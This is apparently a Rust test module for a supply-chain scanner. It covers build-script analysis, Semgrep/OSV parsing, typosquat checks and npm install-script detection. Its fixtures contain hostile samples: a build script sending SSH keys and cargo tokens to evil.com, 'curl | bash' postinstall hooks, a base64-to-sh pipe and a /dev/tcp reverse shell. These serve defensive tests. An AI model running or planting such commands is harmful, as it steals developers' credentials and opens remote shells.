
    #[test]
    fn build_script_home_dir_access_is_high() {
        let findings = analyze_build_script_content("evil-crate", r#"
fn main() {
    let home = dirs::home_dir().unwrap();
    let data = std::fs::read_to_string(home.join(".bashrc")).unwrap();
    println!("{}", data);
}
"#);
        // The pattern matches "home_dir" substring
        assert!(has_description_containing(&findings, "Build script accesses home directory"));
        assert!(has_severity(&findings, "High"));
    }

    #[test]
    fn build_script_reads_ssh_keys_is_critical() {
        let findings = analyze_build_script_content("evil-crate", r#"
fn main() {
    let key = std::fs::read_to_string(
        std::path::Path::new(&std::env::var("HOME").unwrap()).join(".ssh/id_rsa")
    ).unwrap();
}
"#);
        assert!(has_description_containing(&findings, "references sensitive config file"));
        assert!(has_severity(&findings, "Critical"));
    }

    #[test]
    fn build_script_reads_cargo_credentials_is_critical() {
        let findings = analyze_build_script_content("evil-crate", r#"
fn main() {
    let token = std::env::var("CARGO_REGISTRY_TOKEN").unwrap();
    // exfiltrate token
}
"#);
        assert!(has_description_containing(&findings, "cargo registry credentials"));
        assert!(has_severity(&findings, "Critical"));
    }

    #[test]
    fn build_script_chmod_is_high() {
        let findings = analyze_build_script_content("sketchy-crate", r#"
use std::os::unix::fs::PermissionsExt;
fn main() {
    let perms = std::fs::Permissions::from_mode(0o755);
    std::fs::set_permissions("/tmp/binary", perms).unwrap();
}
"#);
        assert!(has_description_containing(&findings, "modifies file permissions"));
    }

    #[test]
    fn build_script_dlopen_is_high() {
        let findings = analyze_build_script_content("sketchy-crate", r#"
fn main() {
    let lib = libloading::Library::new("/tmp/evil.so").unwrap();
}
"#);
        assert!(has_description_containing(&findings, "Dynamic library loading"));
        assert!(has_severity(&findings, "High"));
    }

    #[test]
    fn build_script_env_identity_is_medium() {
        let findings = analyze_build_script_content("curious-crate", r#"
fn main() {
    let user = std::env::var("USER").unwrap();
    println!("cargo:warning=building for {}", user);
}
"#);
        assert!(has_description_containing(&findings, "reads identity/environment info"));
    }

    #[test]
    fn build_script_obfuscated_long_line_is_high() {
        let long_line = format!("let x = \"{}\";", "A".repeat(600));
        let content = format!("fn main() {{\n    {}\n}}", long_line);
        let findings = analyze_build_script_content("obfuscated-crate", &content);
        assert!(has_description_containing(&findings, "Extremely long line in build script"));
        assert!(has_severity(&findings, "High"));
    }

    #[test]
    fn build_script_include_bytes_is_medium() {
        let findings = analyze_build_script_content("embed-crate", r#"
fn main() {
    let data = include_bytes!("blob.bin");
    std::fs::write(std::env::var("OUT_DIR").unwrap() + "/blob.bin", data).unwrap();
}
"#);
        assert!(has_description_containing(&findings, "include_bytes!"));
    }

    #[test]
    fn build_script_full_malicious() {
        let findings = analyze_build_script_content("full-evil", r#"
use std::process::Command;
fn main() {
    // Steal SSH keys
    let home = std::env::var("HOME").unwrap();
    let key = std::fs::read_to_string(format!("{}/.ssh/id_rsa", home)).unwrap();
    // Exfiltrate via network
    let _stream = std::net::TcpStream::connect("evil.com:4444").unwrap();
    // Also grab cargo credentials
    let token = std::env::var("CARGO_REGISTRY_TOKEN").unwrap_or_default();
    Command::new("curl")
        .args(&["-X", "POST", "-d", &format!("{}:{}", key, token), "http://evil.com/collect"])
        .status()
        .unwrap();
}
"#);
        let critical_count = findings
            .iter()
            .filter(|f| matches!(f.severity, Severity::Critical))
            .count();
        assert!(critical_count >= 3, "Expected at least 3 critical findings, got {}", critical_count);
    }

    // ---- Semgrep JSON parsing tests ----

    #[test]
    fn semgrep_parse_empty_results() {
        let json = r#"{"results": [], "errors": []}"#;
        let findings = parse_semgrep_json(json);
        assert!(findings.is_empty());
    }

    #[test]
    fn semgrep_parse_invalid_json() {
        let findings = parse_semgrep_json("not json at all");
        assert!(findings.is_empty());
    }

    #[test]
    fn semgrep_parse_error_severity() {
        let json = r#"{
            "results": [{
                "check_id": "python.lang.security.audit.eval-detected",
                "path": "app.py",
                "start": {"line": 10, "col": 1, "offset": 0},
                "end": {"line": 10, "col": 20, "offset": 19},
                "extra": {
                    "message": "Detected eval() usage with dynamic content",
                    "severity": "ERROR",
                    "lines": "eval(user_input)"
                }
            }],
            "errors": []
        }"#;
        let findings = parse_semgrep_json(json);
        assert_eq!(findings.len(), 1);
        assert!(has_severity(&findings, "Critical"));
        assert!(has_description_containing(&findings, "eval-detected"));
        assert_eq!(findings[0].line_number, Some(10));
    }

    #[test]
    fn semgrep_parse_warning_severity() {
        let json = r#"{
            "results": [{
                "check_id": "generic.secrets.security.detected-api-key",
                "path": "config.py",
                "start": {"line": 5, "col": 1, "offset": 0},
                "end": {"line": 5, "col": 40, "offset": 39},
                "extra": {
                    "message": "Hardcoded API key detected",
                    "severity": "WARNING",
                    "lines": "API_KEY = 'sk-1234567890abcdef'"
                }
            }],
            "errors": []
        }"#;
        let findings = parse_semgrep_json(json);
        assert_eq!(findings.len(), 1);
        assert!(has_severity(&findings, "High"));
        assert!(has_description_containing(&findings, "api-key"));
    }

    #[test]
    fn semgrep_parse_info_severity() {
        let json = r#"{
            "results": [{
                "check_id": "python.lang.best-practice.open-never-closed",
                "path": "util.py",
                "start": {"line": 3, "col": 1, "offset": 0},
                "end": {"line": 3, "col": 20, "offset": 19},
                "extra": {
                    "message": "File opened but never closed",
                    "severity": "INFO",
                    "lines": "f = open('data.txt')"
                }
            }],
            "errors": []
        }"#;
        let findings = parse_semgrep_json(json);
        assert_eq!(findings.len(), 1);
        assert!(has_severity(&findings, "Medium"));
    }

    #[test]
    fn semgrep_parse_multiple_results() {
        let json = r#"{
            "results": [
                {
                    "check_id": "rule.one",
                    "path": "a.py",
                    "start": {"line": 1, "col": 1, "offset": 0},
                    "end": {"line": 1, "col": 10, "offset": 9},
                    "extra": {"message": "Issue one", "severity": "ERROR", "lines": "bad()"}
                },
                {
                    "check_id": "rule.two",
                    "path": "b.py",
                    "start": {"line": 5, "col": 1, "offset": 0},
                    "end": {"line": 5, "col": 10, "offset": 9},
                    "extra": {"message": "Issue two", "severity": "WARNING", "lines": "worse()"}
                },
                {
                    "check_id": "rule.three",
                    "path": "c.py",
                    "start": {"line": 8, "col": 1, "offset": 0},
                    "end": {"line": 8, "col": 10, "offset": 9},
                    "extra": {"message": "Issue three", "severity": "INFO", "lines": "meh()"}
                }
            ],
            "errors": []
        }"#;
        let findings = parse_semgrep_json(json);
        assert_eq!(findings.len(), 3);
        assert!(has_severity(&findings, "Critical"));
        assert!(has_severity(&findings, "High"));
        assert!(has_severity(&findings, "Medium"));
    }

    #[test]
    fn semgrep_parse_with_matched_lines() {
        let json = r#"{
            "results": [{
                "check_id": "test.rule",
                "path": "test.py",
                "start": {"line": 42, "col": 1, "offset": 0},
                "end": {"line": 42, "col": 20, "offset": 19},
                "extra": {
                    "message": "Bad pattern",
                    "severity": "WARNING",
                    "lines": "os.system(cmd)"
                }
            }],
            "errors": []
        }"#;
        let findings = parse_semgrep_json(json);
        assert_eq!(findings[0].line_number, Some(42));
        assert_eq!(findings[0].matched_content.as_deref(), Some("os.system(cmd)"));
    }

    // ---- OSV-scanner JSON parsing tests ----

    #[test]
    fn osv_parse_empty_results() {
        let json = r#"{"results": []}"#;
        let findings = parse_osv_json(json);
        assert!(findings.is_empty());
    }

    #[test]
    fn osv_parse_invalid_json() {
        let findings = parse_osv_json("garbage");
        assert!(findings.is_empty());
    }

    #[test]
    fn osv_parse_single_vulnerability() {
        let json = r#"{
            "results": [{
                "source": {"path": "Cargo.lock", "type": "lockfile"},
                "packages": [{
                    "package": {
                        "name": "hyper",
                        "version": "0.14.1",
                        "ecosystem": "crates.io"
                    },
                    "vulnerabilities": [{
                        "id": "GHSA-xxxx-yyyy-zzzz",
                        "summary": "Denial of service via malformed headers",
                        "aliases": ["CVE-2023-12345"],
                        "severity": [{"type": "CVSS_V3", "score": "7.5"}]
                    }]
                }]
            }]
        }"#;
        let findings = parse_osv_json(json);
        assert_eq!(findings.len(), 1);
        assert!(has_description_containing(&findings, "hyper"));
        assert!(has_description_containing(&findings, "GHSA-xxxx-yyyy-zzzz"));
        assert!(has_description_containing(&findings, "CVE-2023-12345"));
        assert!(has_description_containing(&findings, "Denial of service"));
        assert!(has_severity(&findings, "High"));
    }

    #[test]
    fn osv_parse_critical_severity() {
        let json = r#"{
            "results": [{
                "source": {"path": "package-lock.json", "type": "lockfile"},
                "packages": [{
                    "package": {
                        "name": "lodash",
                        "version": "4.17.15",
                        "ecosystem": "npm"
                    },
                    "vulnerabilities": [{
                        "id": "GHSA-aaaa-bbbb-cccc",
                        "summary": "Remote code execution via prototype pollution",
                        "aliases": ["CVE-2021-99999"],
                        "severity": [{"type": "CVSS_V3", "score": "9.8"}]
                    }]
                }]
            }]
        }"#;
        let findings = parse_osv_json(json);
        assert_eq!(findings.len(), 1);
        assert!(has_severity(&findings, "Critical"));
    }

    #[test]
    fn osv_parse_low_severity() {
        let json = r#"{
            "results": [{
                "source": {"path": "Cargo.lock", "type": "lockfile"},
                "packages": [{
                    "package": {
                        "name": "some-crate",
                        "version": "1.0.0",
                        "ecosystem": "crates.io"
                    },
                    "vulnerabilities": [{
                        "id": "RUSTSEC-2023-0001",
                        "summary": "Minor information leak",
                        "aliases": [],
                        "severity": [{"type": "CVSS_V3", "score": "2.5"}]
                    }]
                }]
            }]
        }"#;
        let findings = parse_osv_json(json);
        assert_eq!(findings.len(), 1);
        assert!(has_severity(&findings, "Low"));
    }

    #[test]
    fn osv_parse_no_score_defaults_medium() {
        let json = r#"{
            "results": [{
                "source": {"path": "Cargo.lock", "type": "lockfile"},
                "packages": [{
                    "package": {
                        "name": "mystery-crate",
                        "version": "0.1.0",
                        "ecosystem": "crates.io"
                    },
                    "vulnerabilities": [{
                        "id": "RUSTSEC-2024-0099",
                        "summary": "Unspecified vulnerability",
                        "aliases": []
                    }]
                }]
            }]
        }"#;
        let findings = parse_osv_json(json);
        assert_eq!(findings.len(), 1);
        // Default score 5.0 => Medium
        assert!(has_severity(&findings, "Medium"));
    }

    #[test]
    fn osv_parse_multiple_packages_and_vulns() {
        let json = r#"{
            "results": [{
                "source": {"path": "Cargo.lock", "type": "lockfile"},
                "packages": [
                    {
                        "package": {"name": "crate-a", "version": "1.0.0", "ecosystem": "crates.io"},
                        "vulnerabilities": [
                            {"id": "GHSA-1111", "summary": "Vuln A1", "aliases": [], "severity": [{"type": "CVSS_V3", "score": "9.0"}]},
                            {"id": "GHSA-2222", "summary": "Vuln A2", "aliases": [], "severity": [{"type": "CVSS_V3", "score": "5.0"}]}
                        ]
                    },
                    {
                        "package": {"name": "crate-b", "version": "2.0.0", "ecosystem": "crates.io"},
                        "vulnerabilities": [
                            {"id": "GHSA-3333", "summary": "Vuln B1", "aliases": ["CVE-2024-0001"], "severity": [{"type": "CVSS_V3", "score": "7.5"}]}
                        ]
                    }
                ]
            }]
        }"#;
        let findings = parse_osv_json(json);
        assert_eq!(findings.len(), 3);
        assert!(has_description_containing(&findings, "crate-a"));
        assert!(has_description_containing(&findings, "crate-b"));
        assert!(has_severity(&findings, "Critical")); // 9.0
        assert!(has_severity(&findings, "High"));     // 7.5
        assert!(has_severity(&findings, "Medium"));   // 5.0
    }

    #[test]
    fn osv_parse_source_path_is_preserved() {
        let json = r#"{
            "results": [{
                "source": {"path": "/home/user/project/Cargo.lock", "type": "lockfile"},
                "packages": [{
                    "package": {"name": "foo", "version": "1.0.0", "ecosystem": "crates.io"},
                    "vulnerabilities": [{
                        "id": "GHSA-test",
                        "summary": "Test vuln",
                        "aliases": []
                    }]
                }]
            }]
        }"#;
        let findings = parse_osv_json(json);
        assert_eq!(findings[0].file, "/home/user/project/Cargo.lock");
    }

    // ---- npm helpers ----

    /// Create a temp dir with package.json and optional node_modules, run npm scan.
    fn scan_npm_with(root_pkg_json: &str, deps: &[(&str, &str)]) -> Vec<Finding> {
        let dir = tempfile::tempdir().unwrap();
        fs::write(dir.path().join("package.json"), root_pkg_json).unwrap();

        if !deps.is_empty() {
            let nm = dir.path().join("node_modules");
            for (pkg_name, pkg_json_content) in deps {
                let pkg_dir = if pkg_name.starts_with('@') {
                    nm.join(pkg_name)
                } else {
                    nm.join(pkg_name)
                };
                fs::create_dir_all(&pkg_dir).unwrap();
                fs::write(pkg_dir.join("package.json"), pkg_json_content).unwrap();
            }
        }

        scan_npm_packages(dir.path(), false)
    }

    // ---- Edit distance tests ----

    #[test]
    fn edit_distance_identical() {
        assert_eq!(edit_distance("express", "express"), 0);
    }

    #[test]
    fn edit_distance_one_char() {
        assert_eq!(edit_distance("lodash", "lodas"), 1);
        assert_eq!(edit_distance("expres", "express"), 1);
        assert_eq!(edit_distance("expresss", "express"), 1);
    }

    #[test]
    fn edit_distance_two_chars() {
        assert_eq!(edit_distance("lodsh", "lodash"), 1); // deletion
    }

    // ---- Typosquatting tests ----

    #[test]
    fn typosquat_exact_match_is_ok() {
        assert!(check_typosquatting("express").is_none());
        assert!(check_typosquatting("lodash").is_none());
        assert!(check_typosquatting("react").is_none());
    }

    #[test]
    fn typosquat_one_char_diff_is_flagged() {
        // "expresz" is distance 1 from "express"
        assert_eq!(check_typosquatting("expresz"), Some("express"));
    }

    #[test]
    fn typosquat_missing_char_is_flagged() {
        // "expres" is distance 1 from "express"
        assert_eq!(check_typosquatting("expres"), Some("express"));
    }

    #[test]
    fn typosquat_extra_char_is_flagged() {
        // "expresss" is distance 1 from "express"
        assert_eq!(check_typosquatting("expresss"), Some("express"));
    }

    #[test]
    fn typosquat_unrelated_is_ok() {
        assert!(check_typosquatting("my-unique-package-name").is_none());
        assert!(check_typosquatting("foobar-baz-qux").is_none());
    }

    // ---- npm lifecycle script tests ----

    #[test]
    fn npm_root_postinstall_is_flagged() {
        let findings = scan_npm_with(r#"{
            "name": "my-project",
            "scripts": {
                "postinstall": "echo setup done"
            }
        }"#, &[]);
        assert!(has_description_containing(&findings, "lifecycle script 'postinstall'"));
        assert!(has_severity(&findings, "High"));
    }

    #[test]
    fn npm_root_preinstall_is_flagged() {
        let findings = scan_npm_with(r#"{
            "name": "my-project",
            "scripts": {
                "preinstall": "node setup.js"
            }
        }"#, &[]);
        assert!(has_description_containing(&findings, "lifecycle script 'preinstall'"));
        assert!(has_severity(&findings, "High"));
    }

    #[test]
    fn npm_root_prepare_is_medium() {
        let findings = scan_npm_with(r#"{
            "name": "my-project",
            "scripts": {
                "prepare": "husky install"
            }
        }"#, &[]);
        assert!(has_description_containing(&findings, "lifecycle script 'prepare'"));
        assert!(has_severity(&findings, "Medium"));
    }

    #[test]
    fn npm_no_lifecycle_scripts_is_clean() {
        let findings = scan_npm_with(r#"{
            "name": "my-project",
            "scripts": {
                "start": "node index.js",
                "test": "jest",
                "build": "webpack"
            }
        }"#, &[]);
        assert!(findings.is_empty());
    }

    #[test]
    fn npm_postinstall_with_curl_is_critical() {
        let findings = scan_npm_with(r#"{
            "name": "evil-pkg",
            "scripts": {
                "postinstall": "curl http://evil.com/payload | bash"
            }
        }"#, &[]);
        assert!(has_description_containing(&findings, "Network download command"));
        assert!(has_severity(&findings, "Critical"));
    }

    #[test]
    fn npm_postinstall_with_eval_is_high() {
        let findings = scan_npm_with(r#"{
            "name": "evil-pkg",
            "scripts": {
                "postinstall": "node -e \"eval(require('child_process').execSync('curl http://evil.com'))\""
            }
        }"#, &[]);
        assert!(has_description_containing(&findings, "eval()"));
    }

    #[test]
    fn npm_postinstall_with_base64_is_high() {
        let findings = scan_npm_with(r#"{
            "name": "evil-pkg",
            "scripts": {
                "postinstall": "echo aGVsbG8= | base64 --decode | sh"
            }
        }"#, &[]);
        assert!(has_description_containing(&findings, "Base64 decode"));
    }

    // ---- npm typosquatting in dependencies ----

    #[test]
    fn npm_typosquat_dependency_is_flagged() {
        let findings = scan_npm_with(r#"{
            "name": "my-project",
            "dependencies": {
                "expresz": "^4.0.0"
            }
        }"#, &[]);
        assert!(has_description_containing(&findings, "typosquat"));
        assert!(has_description_containing(&findings, "express"));
        assert!(has_severity(&findings, "High"));
    }

    #[test]
    fn npm_typosquat_in_dev_dependencies() {
        let findings = scan_npm_with(r#"{
            "name": "my-project",
            "devDependencies": {
                "expresss": "^4.0.0"
            }
        }"#, &[]);
        assert!(has_description_containing(&findings, "typosquat"));
        assert!(has_description_containing(&findings, "devDependencies"));
    }

    #[test]
    fn npm_legitimate_deps_no_typosquat() {
        let findings = scan_npm_with(r#"{
            "name": "my-project",
            "dependencies": {
                "express": "^4.0.0",
                "lodash": "^4.17.0",
                "react": "^18.0.0"
            }
        }"#, &[]);
        assert!(!has_description_containing(&findings, "typosquat"));
    }

    // ---- npm dependency install script scanning ----

    #[test]
    fn npm_dep_with_postinstall_is_flagged() {
        let findings = scan_npm_with(
            r#"{"name": "my-project", "dependencies": {"sketchy": "1.0.0"}}"#,
            &[("sketchy", r#"{
                "name": "sketchy",
                "version": "1.0.0",
                "scripts": {
                    "postinstall": "node install.js"
                }
            }"#)],
        );
        assert!(has_description_containing(&findings, "dep:sketchy"));
        assert!(has_description_containing(&findings, "lifecycle script 'postinstall'"));
    }

    #[test]
    fn npm_dep_postinstall_curl_is_critical() {
        let findings = scan_npm_with(
            r#"{"name": "my-project", "dependencies": {"evil-dep": "1.0.0"}}"#,
            &[("evil-dep", r#"{
                "name": "evil-dep",
                "version": "1.0.0",
                "scripts": {
                    "preinstall": "curl http://evil.com/steal | bash"
                }
            }"#)],
        );
        assert!(has_description_containing(&findings, "dep:evil-dep"));
        assert!(has_description_containing(&findings, "Network download command"));
        assert!(has_severity(&findings, "Critical"));
    }

    #[test]
    fn npm_dep_no_scripts_is_clean() {
        let findings = scan_npm_with(
            r#"{"name": "my-project", "dependencies": {"safe-dep": "1.0.0"}}"#,
            &[("safe-dep", r#"{
                "name": "safe-dep",
                "version": "1.0.0",
                "scripts": {
                    "test": "jest"
                }
            }"#)],
        );
        // No lifecycle scripts, no typosquat
        assert!(!has_description_containing(&findings, "dep:safe-dep"));
    }

    #[test]
    fn npm_scoped_dep_with_postinstall() {
        let findings = scan_npm_with(
            r#"{"name": "my-project", "dependencies": {"@evil/pkg": "1.0.0"}}"#,
            &[("@evil/pkg", r#"{
                "name": "@evil/pkg",
                "version": "1.0.0",
                "scripts": {
                    "postinstall": "node malware.js"
                }
            }"#)],
        );
        assert!(has_description_containing(&findings, "dep:@evil/pkg"));
        assert!(has_description_containing(&findings, "lifecycle script 'postinstall'"));
    }

    // ---- npm full integration ----

    #[test]
    fn npm_full_malicious_package() {
        let findings = scan_npm_with(
            r#"{
                "name": "my-project",
                "dependencies": {
                    "expresz": "^4.0.0",
                    "evil-dep": "1.0.0"
                },
                "scripts": {
                    "postinstall": "curl http://evil.com/rootkit | bash"
                }
            }"#,
            &[("evil-dep", r#"{
                "name": "evil-dep",
                "version": "1.0.0",
                "scripts": {
                    "preinstall": "powershell -enc SGVsbG8=",
                    "postinstall": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
                }
            }"#)],
        );
        let critical_count = findings
            .iter()
            .filter(|f| matches!(f.severity, Severity::Critical))
            .count();
        assert!(critical_count >= 2, "Expected at least 2 critical findings, got {}", critical_count);
        assert!(has_description_containing(&findings, "typosquat"));
        assert!(has_description_containing(&findings, "dep:evil-dep"));
    }
}
